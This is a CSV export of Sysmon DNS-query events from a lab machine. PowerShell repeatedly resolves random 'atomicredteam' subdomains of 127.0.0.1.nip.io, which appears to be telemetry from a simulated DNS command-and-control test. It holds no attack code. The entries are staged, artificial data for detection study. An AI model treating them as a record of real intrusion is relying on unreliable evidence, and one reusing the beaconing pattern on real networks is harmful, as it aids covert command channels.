"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174437,"Query: atomicredteam-965032.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.760","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174438,"Query: atomicredteam-297834.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:14.801","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174439,"Query: atomicredteam-890681.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.005","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174440,"Query: atomicredteam-560331.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.047","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174441,"Query: atomicredteam-875457.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.216","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174442,"Query: atomicredteam-615151.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.257","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174443,"Query: atomicredteam-901202.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.315","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:15.568 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174444,"Query: atomicredteam-969531.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.355","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.586 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174445,"Query: atomicredteam-204325.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.395","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.586 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174446,"Query: atomicredteam-894508.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.566","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.586 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174447,"Query: atomicredteam-315291.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.607","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.586 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174448,"Query: atomicredteam-287611.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.648","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.603 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174449,"Query: atomicredteam-76024.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:15.990","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.604 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174450,"Query: atomicredteam-180855.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.054","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.604 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174451,"Query: atomicredteam-322535.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.093","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.604 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174452,"Query: atomicredteam-937529.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.134","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.604 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174453,"Query: atomicredteam-652902.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.319","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.604 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174454,"Query: atomicredteam-810033.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.380","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:16.604 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174455,"Query: atomicredteam-786758.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.418","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174456,"Query: atomicredteam-359265.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.480","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174457,"Query: atomicredteam-922851.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.541","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174458,"Query: atomicredteam-978801.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.608","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174459,"Query: atomicredteam-377253.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:16.670","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174460,"Query: atomicredteam-96110.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:17.016","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174461,"Query: atomicredteam-239454.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:17.215","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174462,"Query: atomicredteam-665729.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:17.261","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174463,"Query: atomicredteam-12005.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:17.304","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174464,"Query: atomicredteam-367726.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:17.491","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:17.607 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174465,"Query: atomicredteam-7333.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:17.542","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:18.642 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174466,"Query: atomicredteam-789771.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:17.605","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:18.642 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174467,"Query: atomicredteam-578907.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:17.643","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:18.649 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174468,"Query: atomicredteam-221963.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:17.912","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:18.650 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174469,"Query: atomicredteam-898277.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:18.179","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:19.629 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174470,"Query: atomicredteam-482856.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:18.350","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:19.630 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174471,"Query: atomicredteam-237959.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:18.533","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:19.630 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174472,"Query: atomicredteam-885113.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:18.626","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:19.630 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174473,"Query: atomicredteam-54680.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:18.963","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:19.630 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174474,"Query: atomicredteam-629022.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.007","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:19.630 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174475,"Query: atomicredteam-455254.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.064","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:19.630 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174476,"Query: atomicredteam-752164.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.253","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:19.630 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174477,"Query: atomicredteam-356359.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.342","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:19.630 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174478,"Query: atomicredteam-812466.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.399","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.667 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174479,"Query: atomicredteam-915116.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.440","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.668 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174480,"Query: atomicredteam-801979.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.481","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.668 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174481,"Query: atomicredteam-180252.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.805","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.668 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174482,"Query: atomicredteam-377371.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.844","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.668 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174483,"Query: atomicredteam-369047.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.887","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:20.668 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174484,"Query: atomicredteam-67919.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:19.953","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
